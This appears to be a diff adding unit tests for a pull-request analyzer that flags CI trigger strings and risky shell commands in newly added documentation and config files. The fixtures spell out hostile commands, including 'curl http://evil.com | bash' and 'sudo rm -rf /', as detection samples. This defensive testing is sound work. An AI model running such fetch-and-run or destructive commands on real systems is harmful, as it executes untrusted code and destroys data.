@@ -109,6 +109,7 @@ def _make_full_report(status="SAFE", files_deleted=0, lines_deleted=0):
             "matched_keyword": None,
             "directive": "✓ SAFE. PR description aligns with verified structural impact.",
         },
+        "content_flags": [],
         "deleted_files": {"total": files_deleted, "critical": [], "all": []},
     }
 
@@ -565,6 +566,7 @@ class TestAnalyzeSuccess(unittest.TestCase):
         for key in (
             "timestamp", "analysis", "files", "lines", "temporal",
             "verdict", "deleted_files", "structural", "temporal_drift", "semantic",
+            "content_flags",
         ):
             self.assertIn(key, result)
 
@@ -1368,6 +1370,137 @@ class TestComplexityAdvisory(unittest.TestCase):
         if result["complexity_advisory"]:
             self.assertIn("threshold", result["complexity_advisory"][0])
             self.assertEqual(result["complexity_advisory"][0]["threshold"], 10)
+
+
+# ==============================================================================
+# ADDED FILE CONTENT SCANNING (INC-1, INC-4)
+# ==============================================================================
+
+class TestAddedFileContentScanning(unittest.TestCase):
+    """Tests for _scan_added_file_content — CI triggers and shell patterns in added non-code files."""
+
+    def _build_added_diff(self, path, content):
+        d = MagicMock()
+        d.change_type = "A"
+        d.b_path = path
+        d.b_blob.data_stream.read.return_value = content.encode()
+        return d
+
+    def _make_analyzer_with_diffs(self, diffs):
+        a = _make_analyzer()
+        t1 = datetime(2025, 1, 1, tzinfo=timezone.utc)
+        t2 = datetime(2025, 3, 1, tzinfo=timezone.utc)
+        branch_commit = MagicMock()
+        branch_commit.committed_datetime = t1
+        branch_commit.hexsha = "aabbccddeeff"
+        target_commit = MagicMock()
+        target_commit.committed_datetime = t2
+        target_commit.hexsha = "112233445566"
+        a.repo.commit.side_effect = lambda ref: target_commit if ref == "main" else branch_commit
+        a.repo.iter_commits.return_value = []
+        merge_base_commit = MagicMock()
+        merge_base_commit.diff.return_value = diffs
+        merge_base_commit.hexsha = "deadbeef00000000"
+        a.repo.merge_base.return_value = [merge_base_commit]
+        numstat_lines = []
+        for d in diffs:
+            path = getattr(d, 'b_path', None) or getattr(d, 'a_path', None) or 'file.txt'
+            lines = 0
+            if d.change_type == 'A':
+                try:
+                    lines = len(d.b_blob.data_stream.read().decode('utf-8', errors='ignore').splitlines())
+                except Exception:
+                    pass
+            numstat_lines.append(f"{lines}\t0\t{path}")
+        a.repo.git.diff.return_value = "\n".join(numstat_lines)
+        return a
+
+    def test_ci_trigger_in_added_md_detected(self):
+        d = self._build_added_diff("SETUP.md", "Follow these steps\n[citest commit:abc123]\n")
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertIn("content_flags", result)
+        self.assertEqual(len(result["content_flags"]), 1)
+        self.assertEqual(result["content_flags"][0]["file"], "SETUP.md")
+        self.assertTrue(len(result["content_flags"][0]["ci_triggers"]) > 0)
+
+    def test_shell_pattern_in_added_txt_detected(self):
+        d = self._build_added_diff("DEPLOY.txt", "Deploy steps:\ncurl http://example.com/setup.sh | bash\n")
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(len(result["content_flags"]), 1)
+        self.assertTrue(len(result["content_flags"][0]["shell_patterns"]) > 0)
+
+    def test_needs_ci_trigger_detected(self):
+        d = self._build_added_diff("notes.txt", "needs-ci run on this branch\n")
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(len(result["content_flags"]), 1)
+        self.assertTrue(len(result["content_flags"][0]["ci_triggers"]) > 0)
+
+    def test_sudo_command_detected(self):
+        d = self._build_added_diff("install.md", "Run: sudo chmod -R 777 /var/app\n")
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(len(result["content_flags"]), 1)
+        self.assertTrue(len(result["content_flags"][0]["shell_patterns"]) > 0)
+
+    def test_code_file_extension_skipped(self):
+        d = self._build_added_diff("setup.py", "[citest] and sudo rm -rf /\n")
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["content_flags"], [])
+
+    def test_js_extension_skipped(self):
+        d = self._build_added_diff("util.js", "sudo something; [citest]\n")
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["content_flags"], [])
+
+    def test_clean_markdown_not_flagged(self):
+        d = self._build_added_diff("README.md", "# My Project\n\nThis adds a health check endpoint.\n")
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(result["content_flags"], [])
+
+    def test_content_flag_scores_review(self):
+        d = self._build_added_diff("notes.txt", "[citest commit:abc]\n")
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertIn(result["verdict"]["status"], ("REVIEW", "CAUTION", "DESTRUCTIVE"))
+        self.assertGreater(result["verdict"]["severity_score"], 0)
+
+    def test_multiple_flagged_files_score_accumulates(self):
+        d1 = self._build_added_diff("a.txt", "[citest commit:1]\n")
+        d2 = self._build_added_diff("b.md", "needs-ci\n")
+        a = self._make_analyzer_with_diffs([d1, d2])
+        result = a.analyze()
+        self.assertEqual(len(result["content_flags"]), 2)
+        self.assertGreaterEqual(result["verdict"]["severity_score"], 4)
+
+    def test_decode_error_does_not_crash(self):
+        d = MagicMock()
+        d.change_type = "A"
+        d.b_path = "data.txt"
+        d.b_blob.data_stream.read.side_effect = Exception("read error")
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertNotIn("error", result)
+        self.assertEqual(result["content_flags"], [])
+
+    def test_yaml_file_scanned(self):
+        d = self._build_added_diff("config.yml", "run: sudo apt-get install -y pkg\n")
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(len(result["content_flags"]), 1)
+
+    def test_both_ci_and_shell_in_same_file(self):
+        d = self._build_added_diff("bootstrap.txt", "[citest commit:x]\ncurl http://evil.com | bash\n")
+        a = self._make_analyzer_with_diffs([d])
+        result = a.analyze()
+        self.assertEqual(len(result["content_flags"]), 1)
+        self.assertTrue(len(result["content_flags"][0]["ci_triggers"]) > 0)
+        self.assertTrue(len(result["content_flags"][0]["shell_patterns"]) > 0)
 
 
 if __name__ == "__main__":
